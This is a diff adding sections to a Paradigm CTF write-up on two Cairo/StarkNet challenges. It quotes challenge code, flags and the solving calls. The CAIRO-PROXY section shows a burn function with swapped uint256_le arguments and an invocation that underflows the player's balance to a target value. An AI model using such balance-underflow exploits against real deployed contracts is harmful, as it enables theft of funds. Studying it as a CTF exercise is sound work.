@@ -2,7 +2,8 @@
 
 _This writeup is **WIP** and frequently updated._
 
-Paradigm CTF: https://twitter.com/paradigm_ctf
+Paradigm CTF: https://twitter.com/paradigm_ctf.
+The source code for the ctf infrastructure is in [paradigmxyz/paradigm-ctf-infrastructure](https://github.com/paradigmxyz/paradigm-ctf-infrastructure).
 
 The challenges I solved during the contest are as follows. 
 
@@ -329,6 +330,55 @@ Flag: `PCTF{d0n7_y0u_10v3_f1nd1n9_0d4y5_1n_4_c7f}`
 
 ### RIDDLE-OF-THE-SPHINX
 
+Reading `chal.py`, we see that the goal is to make the result of the `solution` function call to the challenge contract `bytes_to_long(b "man")`.
+```py
+async def checker(client: AccountClient, riddle_contract: Contract, player_address: int) -> bool:
+    solution = (await riddle_contract.functions["solution"].call()).solution
+
+    return to_bytes(solution).lstrip(b"\x00") == b"man"
+```
+
+The value of `bytes_to_long(b "man")` is calculated to be `7168366`.
+```
+$ python -c "from Crypto.Util.number import bytes_to_long; print(bytes_to_long(b'man'))"
+7168366
+```
+
+The `solution` function of the challenge contract reads and returns `_solution`.
+```cairo
+@view
+func solution{
+    syscall_ptr : felt*,
+    pedersen_ptr : HashBuiltin*,
+    range_check_ptr,
+}() -> (solution : felt):
+    let (solution) = _solution.read()
+    return (solution)
+end
+```
+
+The `solve` function can write `_solution`.
+```cairo
+@storage_var
+func _solution() -> (res : felt):
+end
+
+@external
+func solve{
+    syscall_ptr : felt*,
+    pedersen_ptr : HashBuiltin*,
+    range_check_ptr,
+}(solution : felt):
+    _solution.write(solution)
+    return ()
+end
+```
+
+Thus, for example, the condition of `checker` is satisfied by executing the `solve` function as follows.
+```py
+await contract.functions["solve"].invoke(7168366, max_fee=int(1e16))
+```
+
 **Exploit**
 ```
 python exploit.py
@@ -337,6 +387,60 @@ python exploit.py
 Flag: `PCTF{600D_1UCK_H4V3_FUN}`
 
 ### CAIRO-PROXY
+
+Reading `chal.py`, we see that the goal is to make the player's balance `int(50000e18)`.
+```py
+async def checker(client: AccountClient, proxy_contract: Contract, player_address: int) -> bool:
+    erc20_address = calculate_contract_address_from_hash(
+        salt=111111,
+        class_hash=await client.get_storage_at(proxy_contract.address, get_storage_var_address("implementation"), "latest"),
+        constructor_calldata=[],
+        deployer_address=0,
+    )
+
+    erc20_contract = await Contract.from_address(erc20_address, client)
+
+    wrapper_contract = Contract(
+        proxy_contract.address,
+        erc20_contract.data.abi,
+        client,
+    )
+    
+    player_balance = (await wrapper_contract.functions["balanceOf"].call(player_address)).balance
+
+    return player_balance == int(50000e18)
+```
+
+There is a vulnerability in the `burn` function of the `almost_erc20`  contract that causes account balances to overflow.
+```py
+@external
+func burn{
+    syscall_ptr : felt*,
+    pedersen_ptr : HashBuiltin*,
+    range_check_ptr,
+    }(account : felt, amount : Uint256):
+    alloc_locals
+
+    uint256_check(amount)
+    let (account_balance) = balances.read(account=account)
+
+    let (enough_balance) = uint256_le(account_balance, amount)
+    assert enough_balance = TRUE
+
+    let (new_account_balance) = uint256_sub(account_balance, amount)
+
+    balances.write(account=account, value=new_account_balance)
+
+    return()
+end
+```
+
+`uint256_le(account_balance, amount)` is wrong. The correct code is `uint256_le(amount, account_balance)`.
+
+Thus, for example, the condition of `checker` is satisfied by executiing the 
+```py
+await wrapper_contract.functions["burn"].invoke(player_address, (1 << 256) - int(50000e18), max_fee=int(1e16))
+```
 
 **Generate ABI**
 ```
